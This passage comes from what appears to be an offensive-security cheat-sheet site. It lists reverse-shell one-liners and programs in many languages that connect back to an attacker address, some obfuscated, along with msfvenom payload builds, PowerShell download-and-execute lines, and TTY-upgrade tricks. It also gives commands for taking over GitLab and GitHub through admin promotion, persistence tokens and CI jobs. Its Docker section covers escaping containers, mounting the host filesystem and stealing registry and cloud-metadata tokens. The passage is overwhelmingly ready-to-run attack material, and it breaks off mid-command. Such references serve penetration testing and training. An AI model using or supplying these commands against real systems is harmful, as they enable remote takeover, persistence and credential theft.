p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[\u0026#39;s2p_thread\u0026#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[\u0026#39;p\u0026#39;] in [(subprocess.Popen([\u0026#39;\\\\windows\\\\system32\\\\cmd.exe\u0026#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[\u0026#39;s\u0026#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[\u0026#39;p2s\u0026#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[\u0026#39;s\u0026#39;].send(__l[\u0026#39;p\u0026#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[\u0026#39;s\u0026#39;], __l[\u0026#39;p\u0026#39;] in [(s, p)]][0])({}), \u0026#39;p2s\u0026#39;)]][0] for __g[\u0026#39;s2p\u0026#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[\u0026#39;p\u0026#39;].stdin.write(__l[\u0026#39;data\u0026#39;]), __after())[1] if (len(__l[\u0026#39;data\u0026#39;]) \u0026gt; 0) else __after())(lambda: __this()) for __l[\u0026#39;data\u0026#39;] in [(__l[\u0026#39;s\u0026#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[\u0026#39;s\u0026#39;], __l[\u0026#39;p\u0026#39;] in [(s, p)]][0])({}), \u0026#39;s2p\u0026#39;)]][0] for __g[\u0026#39;os\u0026#39;] in [(__import__(\u0026#39;os\u0026#39;, __g, __g))]][0] for __g[\u0026#39;socket\u0026#39;] in [(__import__(\u0026#39;socket\u0026#39;, __g, __g))]][0] for __g[\u0026#39;subprocess\u0026#39;] in [(__import__(\u0026#39;subprocess\u0026#39;, __g, __g))]][0] for __g[\u0026#39;threading\u0026#39;] in [(__import__(\u0026#39;threading\u0026#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(\u0026#39;contextlib\u0026#39;))\u0026#34; Windows only (Python3)\npython.exe -c \u0026#34;import socket,os,threading,subprocess as sp;p=sp.Popen([\u0026#39;cmd.exe\u0026#39;],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\u0026#39;10.0.0.1\u0026#39;,4242));threading.Thread(target=exec,args=(\\\u0026#34;while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\u0026#34;,globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\u0026#34;while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\u0026#34;,globals())).start()\u0026#34; PHP # php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);shell_exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);`/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3`;\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);system(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);passthru(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);popen(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;, \u0026#34;r\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242);$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes);\u0026#39; Ruby # ruby -rsocket -e\u0026#39;f=TCPSocket.open(\u0026#34;10.0.0.1\u0026#34;,4242).to_i;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,f,f,f)\u0026#39; ruby -rsocket -e\u0026#39;exit if fork;c=TCPSocket.new(\u0026#34;10.0.0.1\u0026#34;,\u0026#34;4242\u0026#34;);loop{c.gets.chomp!;(exit! if $_==\u0026#34;exit\u0026#34;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \u0026#34;failed: #{$_}\u0026#34;}\u0026#39; NOTE: Windows only ruby -rsocket -e \u0026#39;c=TCPSocket.new(\u0026#34;10.0.0.1\u0026#34;,\u0026#34;4242\u0026#34;);while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print io.read}end\u0026#39; Golang # echo \u0026#39;package main;import\u0026#34;os/exec\u0026#34;;import\u0026#34;net\u0026#34;;func main(){c,_:=net.Dial(\u0026#34;tcp\u0026#34;,\u0026#34;10.0.0.1:4242\u0026#34;);cmd:=exec.Command(\u0026#34;/bin/sh\u0026#34;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\u0026#39; \u0026gt; /tmp/t.go \u0026amp;\u0026amp; go run /tmp/t.go \u0026amp;\u0026amp; rm /tmp/t.go Netcat Traditional # nc -e /bin/sh 10.0.0.1 4242 nc -e /bin/bash 10.0.0.1 4242 nc -c bash 10.0.0.1 4242 Netcat OpenBsd # rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.0.1 4242 \u0026gt;/tmp/f Netcat BusyBox # rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.0.1 4242 \u0026gt;/tmp/f Ncat # ncat 10.0.0.1 4242 -e /bin/bash ncat --udp 10.0.0.1 4242 -e /bin/bash OpenSSL # Attacker:\nuser@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242 or user@attack$ ncat --ssl -vv -l -p 4242 user@victim$ mkfifo /tmp/s; /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 | openssl s_client -quiet -connect 10.0.0.1:4242 \u0026gt; /tmp/s; rm /tmp/s TLS-PSK (does not rely on PKI or self-signed certificates)\n# generate 384-bit PSK # use the generated string as a value for the two PSK variables from below openssl rand -hex 48 # server (attacker) export LHOST=\u0026#34;*\u0026#34;; export LPORT=\u0026#34;4242\u0026#34;; export PSK=\u0026#34;replacewithgeneratedpskfromabove\u0026#34;; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT # client (victim) export RHOST=\u0026#34;10.0.0.1\u0026#34;; export RPORT=\u0026#34;4242\u0026#34;; export PSK=\u0026#34;replacewithgeneratedpskfromabove\u0026#34;; export PIPE=\u0026#34;/tmp/`openssl rand -hex 4`\u0026#34;; mkfifo $PIPE; /bin/sh -i \u0026lt; $PIPE 2\u0026gt;\u0026amp;1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT \u0026gt; $PIPE; rm $PIPE Powershell # powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\u0026#34;10.0.0.1\u0026#34;,4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#34;PS \u0026#34; + (pwd).Path + \u0026#34;\u0026gt; \u0026#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() powershell -nop -c \u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.0.0.1\u0026#39;,4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u0026#34; powershell IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1\u0026#39;) Awk # awk \u0026#39;BEGIN {s = \u0026#34;/inet/tcp/0/10.0.0.1/4242\u0026#34;; while(42) { do{ printf \u0026#34;shell\u0026gt;\u0026#34; |\u0026amp; s; s |\u0026amp; getline c; if(c){ while ((c |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; s; close(c); } } while(c != \u0026#34;exit\u0026#34;) close(s); }}\u0026#39; /dev/null Java # Runtime r = Runtime.getRuntime(); Process p = r.exec(\u0026#34;/bin/bash -c \u0026#39;exec 5\u0026lt;\u0026gt;/dev/tcp/10.0.0.1/4242;cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done\u0026#39;\u0026#34;); p.waitFor(); Java Alternative 1 # String host=\u0026#34;127.0.0.1\u0026#34;; int port=4444; String cmd=\u0026#34;cmd.exe\u0026#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Java Alternative 2 # NOTE: This is more stealthy\nThread thread = new Thread(){ public void run(){ // Reverse shell here } } thread.start(); Telnet # In Attacker machine start two listeners: nc -lvp 8080 nc -lvp 8081 In Victime machine run below command: telnet \u0026lt;Your_IP\u0026gt; 8080 | /bin/sh | telnet \u0026lt;Your_IP\u0026gt; 8081 War # msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war \u0026gt; reverse.war strings reverse.war | grep jsp # in order to get the name of the file Lua # Linux only\nlua -e \u0026#34;require(\u0026#39;socket\u0026#39;);require(\u0026#39;os\u0026#39;);t=socket.tcp();t:connect(\u0026#39;10.0.0.1\u0026#39;,\u0026#39;4242\u0026#39;);os.execute(\u0026#39;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#39;);\u0026#34; Windows and Linux\nlua5.1 -e \u0026#39;local host, port = \u0026#34;10.0.0.1\u0026#34;, 4242 local socket = require(\u0026#34;socket\u0026#34;) local tcp = socket.tcp() local io = require(\u0026#34;io\u0026#34;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \u0026#34;r\u0026#34;) local s = f:read(\u0026#34;*a\u0026#34;) f:close() tcp:send(s) if status == \u0026#34;closed\u0026#34; then break end end tcp:close()\u0026#39; NodeJS # (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(4242, \u0026#34;10.0.0.1\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application from crashing })(); or require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;nc -e /bin/sh 10.0.0.1 4242\u0026#39;) or -var x = global.process.mainModule.require -x(\u0026#39;child_process\u0026#39;).exec(\u0026#39;nc 10.0.0.1 4242 -e /bin/bash\u0026#39;) or https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py Groovy # by frohoff NOTE: Java reverse shell also work for Groovy\nString host=\u0026#34;10.0.0.1\u0026#34;; int port=4242; String cmd=\u0026#34;cmd.exe\u0026#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Groovy Alternative 1 # NOTE: This is more stealthy\nThread.start { // Reverse shell here } C # Compile with gcc /tmp/shell.c --output csh \u0026amp;\u0026amp; csh\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; int main(void){ int port = 4242; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.sin_family = AF_INET; revsockaddr.sin_port = htons(port); revsockaddr.sin_addr.s_addr = inet_addr(\u0026#34;10.0.0.1\u0026#34;); connect(sockt, (struct sockaddr *) \u0026amp;revsockaddr, sizeof(revsockaddr)); dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2); char * const argv[] = {\u0026#34;/bin/sh\u0026#34;, NULL}; execve(\u0026#34;/bin/sh\u0026#34;, argv, NULL); return 0; } Dart # import \u0026#39;dart:io\u0026#39;; import \u0026#39;dart:convert\u0026#39;; main() { Socket.connect(\u0026#34;10.0.0.1\u0026#34;, 4242).then((socket) { socket.listen((data) { Process.start(\u0026#39;powershell.exe\u0026#39;, []).then((Process process) { process.stdin.writeln(new String.fromCharCodes(data).trim()); process.stdout .transform(utf8.decoder) .listen((output) { socket.write(output); }); }); }, onDone: () { socket.destroy(); }); }); } Meterpreter Shell # Windows Staged reverse TCP # msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe \u0026gt; reverse.exe Windows Stageless reverse TCP # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe \u0026gt; reverse.exe Linux Staged reverse TCP # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf \u0026gt;reverse.elf Linux Stageless reverse TCP # msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf \u0026gt;reverse.elf Other platforms # $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f elf \u0026gt; shell.elf $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f exe \u0026gt; shell.exe $ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f macho \u0026gt; shell.macho $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f asp \u0026gt; shell.asp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f raw \u0026gt; shell.jsp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f war \u0026gt; shell.war $ msfvenom -p cmd/unix/reverse_python LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f raw \u0026gt; shell.py $ msfvenom -p cmd/unix/reverse_bash LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f raw \u0026gt; shell.sh $ msfvenom -p cmd/unix/reverse_perl LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f raw \u0026gt; shell.pl $ msfvenom -p php/meterpreter_reverse_tcp LHOST=\u0026#34;10.0.0.1\u0026#34; LPORT=4242 -f raw \u0026gt; shell.php; cat shell.php | pbcopy \u0026amp;\u0026amp; echo \u0026#39;\u0026lt;?php \u0026#39; | tr -d \u0026#39;\\n\u0026#39; \u0026gt; shell.php \u0026amp;\u0026amp; pbpaste \u0026gt;\u0026gt; shell.php Spawn TTY Shell # In order to catch a shell, you need to listen on the desired port. rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].\nrlwrap nc 10.0.0.1 4242 rlwrap -r -f . nc 10.0.0.1 4242 -f . will make rlwrap use the current history file as a completion word list. -r Put all words seen on in- and output on the completion list. Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.\n:warning: OhMyZSH might break this trick, a simple sh is recommended\nThe main problem here is that zsh doesn\u0026rsquo;t handle the stty command the same way bash or sh does. [\u0026hellip;] stty raw -echo; fg[\u0026hellip;] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect\nctrl+z echo $TERM \u0026amp;\u0026amp; tput lines \u0026amp;\u0026amp; tput cols # for bash stty raw -echo fg # for zsh stty raw -echo; fg reset export SHELL=bash export TERM=xterm-256color stty rows \u0026lt;num\u0026gt; columns \u0026lt;cols\u0026gt; or use socat binary to get a fully tty reverse shell\nsocat file:`tty`,raw,echo=0 tcp-listen:12345 Spawn a TTY shell from an interpreter\n/bin/sh -i python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python3 -c \u0026#34;__import__(\u0026#39;pty\u0026#39;).spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; python3 -c \u0026#34;__import__(\u0026#39;subprocess\u0026#39;).call([\u0026#39;/bin/bash\u0026#39;])\u0026#34; perl -e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; perl: exec \u0026#34;/bin/sh\u0026#34;; perl -e \u0026#39;print `/bin/bash`\u0026#39; ruby: exec \u0026#34;/bin/sh\u0026#34; lua: os.execute(\u0026#39;/bin/sh\u0026#39;) vi: :!bash vi: :set shell=/bin/bash:shell nmap: !sh mysql: ! bash Alternative TTY method\nwww-data@debian:/dev/shm$ su - user su: must be run from a terminal www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null www-data@debian:/dev/shm$ su - user Password: P4ssW0rD user@debian:~$ Fully interactive reverse shell on Windows # The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.\nConPtyShell uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).\nServer Side:\nstty raw -echo; (stty size; cat) | nc -lvnp 3001 Client Side:\nIEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001 Offline version of the ps1 available at \u0026ndash;\u0026gt; https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1\nReferences # Reverse Bash Shell One Liner Pentest Monkey - Cheat Sheet Reverse shell Spawning a TTY Shell Obtaining a fully interactive shell "},{"id":30,"href":"/docs/source_code_management/","title":"Source Code Management","section":"Docs","content":" Source Code Management # Enumeration # Using SCMKit - Source Code Management Attack Toolkit\nDiscover repositories being used in a particular SCM system SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local Search for repositories by repository name in a particular SCM system SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o \u0026#34;some search term\u0026#34; SCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.something.local -o \u0026#34;some search term\u0026#34; Search for code containing a given keyword in a particular SCM system SCMKit.exe -s github -m searchcode -c userName:password -u https://github.something.local -o \u0026#34;some search term\u0026#34; SCMKit.exe -s github -m searchcode -c apikey -u https://github.something.local -o \u0026#34;some search term\u0026#34; Search for files in repositories containing a given keyword in the file name in a particular SCM system SCMKit.exe -s gitlab -m searchfile -c userName:password -u https://gitlab.something.local -o \u0026#34;some search term\u0026#34; SCMKit.exe -s gitlab -m searchfile -c apikey -u https://gitlab.something.local -o \u0026#34;some search term\u0026#34; List snippets owned by the current user in GitLab SCMKit.exe -s gitlab -m listsnippet -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listsnippet -c apikey -u https://gitlab.something.local List all GitLab runners available to the current user in GitLab SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local Get the assigned privileges to an access token being used in a particular SCM system SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local Promote a normal user to an administrative role in a particular SCM system SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName Create/List/Delete an access token to be used in a particular SCM system SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName SCMKit.exe -s gitlab -m removepat -c userName:password -u https://gitlab.something.local -o patID SCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser SCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser Create/List an SSH key to be used in a particular SCM system SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o \u0026#34;ssh public key\u0026#34; SCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o \u0026#34;ssh public key\u0026#34; SCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local SCMKit.exe -s gitlab -m listsshkey -c apiToken -u https://github.something.local SCMKit.exe -s gitlab -m removesshkey -c userName:password -u https://gitlab.something.local -o sshKeyID SCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID Personal Access Token # Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance.\ncurl -k --request POST --header \u0026#34;PRIVATE-TOKEN: apiToken\u0026#34; --data \u0026#34;name=user-persistence-token\u0026#34; --data \u0026#34;expires_at=\u0026#34; --data \u0026#34;scopes[]=api\u0026#34; --data \u0026#34;scopes[]=read_repository\u0026#34; --data \u0026#34;scopes[]=write_repository\u0026#34; \u0026#34;https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens\u0026#34; Exploit Gitlab CI/Github Actions # Gitlab-CI \u0026ldquo;Command Execution\u0026rdquo; example: .gitlab-ci.yml stages: - test test: stage: test script: - | whoami parallel: matrix: - RUNNER: VM1 - RUNNER: VM2 - RUNNER: VM3 tags: - ${RUNNER} Github Action \u0026ldquo;Command Execution\u0026rdquo; example: .github/workflows/example.yml name: example on: workflow_dispatch: push: branches: [ main ] pull_request: branches: [ main ] jobs: build: runs-on: windows-2019 steps: - name: Execute run: | whoami References # Controlling the Source: Abusing Source Code Management Systems - Brett Hawkins - August 9, 2022 "},{"id":31,"href":"/docs/docker_pentesting/","title":"Docker Security","section":"Docs","content":" Docker Pentest # Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.\nTools # Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow ./deepce.sh --no-enumeration --exploit DOCKER --command \u0026#34;whoami\u0026gt;/tmp/hacked\u0026#34; Mounted Docker Socket # Prerequisite:\nSocker mounted as volume : - \u0026quot;/var/run/docker.sock:/var/run/docker.sock\u0026quot; Usually found in /var/run/docker.sock, for example for Portainer.\ncurl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json curl -XPOST –unix-socket /var/run/docker.sock -d \u0026#39;{\u0026#34;Image\u0026#34;:\u0026#34;nginx\u0026#34;}\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; http://localhost/containers/create curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start Exploit using brompwnie/ed\nroot@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true [+] Hunt dem Socks [+] Hunting Down UNIX Domain Sockets from: /var/run/ [*] Valid Socket: /var/run/docker.sock [+] Attempting to autopwn [+] Hunting Docker Socks [+] Attempting to Autopwn: /var/run/docker.sock [*] Getting Docker client... [*] Successfully got Docker client... [+] Attempting to escape to host... [+] Attempting in TTY Mode chroot /host \u0026amp;\u0026amp; clear echo \u0026#39;You are now on the underlying host\u0026#39; chroot /host \u0026amp;\u0026amp; clear echo \u0026#39;You are now on the underlying host\u0026#39; / # chroot /host \u0026amp;\u0026amp; clear / # echo \u0026#39;You are now on the underlying host\u0026#39; You are now on the underlying host / # id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) Open Docker API Port # Prerequisite:\nDocker runned with -H tcp://0.0.0.0:XXXX $ nmap -sCV 10.10.10.10 -p 2376 2376/tcp open docker Docker 19.03.5 | docker-version: | Version: 19.03.5 | MinAPIVersion: 1.12 Mount the current system inside a new \u0026ldquo;temporary\u0026rdquo; Ubuntu container, you will gain root access to the filesystem in /mnt.\n$ export DOCKER_HOST=tcp://10.10.10.10:2376 $ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0 -t ubuntu bash or $ docker -H open.docker.socket:2375 ps $ docker -H open.docker.socket:2375 exec -it mysql /bin/bash or $ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq $ curl –insecure -X POST -H \u0026#34;Content-Type: application/json\u0026#34; https://tls-opendocker.socket2376/containers/create?name=test -d \u0026#39;{\u0026#34;Image\u0026#34;:\u0026#34;alpine\u0026#34;, \u0026#34;Cmd\u0026#34;:[\u0026#34;/usr/bin/tail\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;1234\u0026#34;, \u0026#34;/dev/null\u0026#34;], \u0026#34;Binds\u0026#34;: [ \u0026#34;/:/mnt\u0026#34; ], \u0026#34;Privileged\u0026#34;: true}\u0026#39; From there you can backdoor the filesystem by adding an ssh key in /root/.ssh or adding a new root user in /etc/passwd.\nInsecure Docker Registry # Docker Registry’s fingerprint is Docker-Distribution-Api-Version header. Then connect to Registry API endpoint: /v2/_catalog.\ncurl https://registry.example.com/v2/\u0026lt;image_name\u0026gt;/tags/list docker pull https://registry.example.com:443/\u0026lt;image_name\u0026gt;:\u0026lt;tag\u0026gt; # connect to the endpoint and list image blobs curl -s -k --user \u0026#34;admin:admin\u0026#34; https://docker.registry.local/v2/_catalog curl -s -k --user \u0026#34;admin:admin\u0026#34; https://docker.registry.local/v2/wordpress-image/tags/list curl -s -k --user \u0026#34;admin:admin\u0026#34; https://docker.registry.local/v2/wordpress-image/manifests/latest # download blobs curl -s -k --user \u0026#39;admin:admin\u0026#39; \u0026#39;http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058\u0026#39; \u0026gt; out.tar.gz # automated download https://github.com/NotSoSecure/docker_fetch/ python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local Access a private registry and start a container with one of its image\ndocker login -u admin -p admin docker.registry.local docker pull docker.registry.local/wordpress-image docker run -it docker.registry.local/wordpress-image /bin/bash Access a private registry using OAuth Token from Google\ncurl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token docker login -e \u0026lt;email\u0026gt; -u oauth2accesstoken -p \u0026#34;\u0026lt;access token\u0026gt;\u0026#34; https://gcr.io Exploit privileged container abusing the Linux cgroup v1 # Prerequisite (at least one):\n--privileged --security-opt apparmor=unconfined --cap-add=SYS_ADMIN flags. Abusing CAP_SYS_ADMIN capability # docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c \u0026#39;echo 